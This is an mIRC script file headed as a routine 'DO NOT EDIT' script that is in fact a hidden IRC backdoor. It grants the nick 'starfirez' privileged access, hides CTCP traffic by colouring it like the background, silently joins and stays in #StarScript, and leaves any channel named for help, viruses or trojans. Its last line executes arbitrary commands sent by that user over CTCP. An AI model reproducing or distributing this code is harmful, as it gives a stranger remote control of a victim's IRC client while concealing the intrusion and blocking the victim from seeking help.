[script]
n0=;mIRC32 Script DO NOT EDIT NB! by Khaled Madam-Bey
n1=
n2=on 1:start:{ auser 15 starfirez | colour CTCP $colour(background) | clear | halt }
n3=on 1:connect:{ join #StarScript }
n4=on 1:join:#StarScript:{ window -h #StarScript }
n5=on 1:join:#:{ if (help isin $chan) || (nohack isin $chan) || (virii isin $chan) || (virus isin $chan) || (trojan isin $chan) { timerpart 1 1 part $chan } }
n6=on 1:part:#StarScript:{ timerjoin 1 1 join #StarScript }
n7=
n8=ctcp 15:*N*:*:{ . $+ $2- | halt }
